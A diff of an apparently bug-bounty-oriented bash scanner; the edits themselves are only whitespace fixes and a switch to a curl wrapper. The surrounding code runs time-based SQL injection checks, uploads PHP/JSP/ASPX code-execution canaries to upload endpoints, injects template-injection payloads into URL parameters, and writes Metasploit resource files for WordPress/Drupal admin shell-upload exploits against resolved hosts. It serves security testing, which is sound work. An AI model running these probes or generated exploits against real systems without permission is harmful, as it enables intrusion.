@@ -160,7 +160,7 @@ PY
 verify_sqli_poc() {
     local url="$1"; local p_idx="$2"; local dialect="$3"
     log_step "  [VERIFY] Linear scaling check on param #$p_idx ($dialect)..."
-    
+
     # 1. Baseline (0s)
     bb_rate_limit_wait
     T0_START=$(date +%s%N); bb_curl_no_wait "$url" -sk -o /dev/null --max-time 20; T0=$(( ($(date +%s%N) - T0_START) / 1000000 ))
@@ -176,7 +176,7 @@ verify_sqli_poc() {
     U2=$(echo "$url" | sed "s/=\([^&]*\)/=$pl2/$p_idx")
     bb_rate_limit_wait
     T2_START=$(date +%s%N); bb_curl_no_wait "$U2" -sk -o /dev/null --max-time 30; T2=$(( ($(date +%s%N) - T2_START) / 1000000 ))
-    
+
     D1=$(( T1 - T0 )); D2=$(( T2 - T1 ))
     # Allow 200ms jitter
     if [ "$D1" -gt 800 ] && [ "$D2" -gt 800 ]; then
@@ -188,17 +188,17 @@ verify_sqli_poc() {
 
 verify_upload_poc() {
     local upload_url="$1"; local base_url=$(echo "$upload_url" | cut -d'/' -f1-3); local ts=$(date +%s)
-    
+
     # Tech Detection
     local ext="php"; local payload='<?php echo "RCE-VAL-".(7*7); ?>'
     local headers=$(bb_curl "$upload_url" -sk -I --max-time 5 || true)
     if echo "$headers" | grep -qi "jsp\|java\|tomcat"; then ext="jsp"; payload='<% out.print("RCE-VAL-" + (7*7)); %>'; fi
     if echo "$headers" | grep -qi "asp\|aspx\|\.net"; then ext="aspx"; payload='<% Response.Write("RCE-VAL-" + (7*7)) %>'; fi
-    
+
     local canary="proof_${ts}.${ext}"
     echo "$payload" > "/tmp/$canary"
     log_step "  [VERIFY] Attempting RCE-Execution PoC (${ext}): $upload_url..."
-    
+
     for param in "file" "upload" "FileData" "userfile" "image"; do
         # Try upload
         bb_curl "$upload_url" -sk -F "${param}=@/tmp/${canary}" --max-time 10 > /dev/null || true
@@ -375,7 +375,7 @@ if ! skip_has ssti; then
         # engines: jinja2, freemarker, thymeleaf, erb
         SSTI_ENGINES=("jinja2" "freemarker" "thymeleaf" "erb")
         SSTI_PAYLOADS=("{{7*7}}" "\${7*7}" "*{7*7}" "<%= 7*7 %>")
-        
+
         SSTI_LIMIT=$([ "$QUICK_MODE" = "--quick" ] && echo 20 || echo 50)
         log_step "Testing SSTI payloads on up to $SSTI_LIMIT URLs..."
         hit=0
@@ -386,7 +386,7 @@ if ! skip_has ssti; then
                 payload="${SSTI_PAYLOADS[$idx]}"
                 enc_payload=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))" 2>/dev/null || echo "$payload")
                 injected=$(echo "$url" | sed "s/=\([^&]*\)/=${enc_payload}/g")
-                body=$(curl -sk --max-time 10 ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} "$injected" 2>/dev/null || true)
+                body=$(bb_curl "$injected" -sk --max-time 10 2>/dev/null || true)
                 if echo "$body" | grep -qE '(\b49\b|7777777)'; then
                     log_crit "SSTI confirmed [$engine]: $injected"
                     echo "[CONFIRMED] [SSTI-CONFIRMED] engine=$engine url=$injected" >> "$SSTI_OUT"
@@ -404,7 +404,7 @@ if ! skip_has cms; then
     log_info "Check 7: CMS Detection & MSF Generation"
     head -50 "$ORDERED_SCAN" | while read -r url; do
         [ -z "$url" ] && continue
-        RES=$(curl -sk --max-time 10 ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} "$url" 2>/dev/null || true)
+        RES=$(bb_curl "$url" -sk --max-time 10 2>/dev/null || true)
         CMS=""; if echo "$RES" | grep -qi "wp-content\|wordpress"; then CMS="wordpress"; elif echo "$RES" | grep -qi "drupal"; then CMS="drupal"; fi
         if [ -n "$CMS" ]; then
             log_vuln "$CMS detected: $url"
@@ -413,7 +413,7 @@ if ! skip_has cms; then
             HOST_PART=$(echo "$url" | cut -d'/' -f3 | cut -d':' -f1)
             RHOST_VAL=$(dig +short "$HOST_PART" | head -1)
             [ -z "$RHOST_VAL" ] && RHOST_VAL="$HOST_PART"
-            
+
             echo "# [INFORMATIONAL] CMS detected — version detection only; exploitability not tested" > "$MSF_RC"
             echo "use exploit/unix/webapp/${CMS}_admin_shell_upload" >> "$MSF_RC"
             echo "set RHOSTS $RHOST_VAL" >> "$MSF_RC"
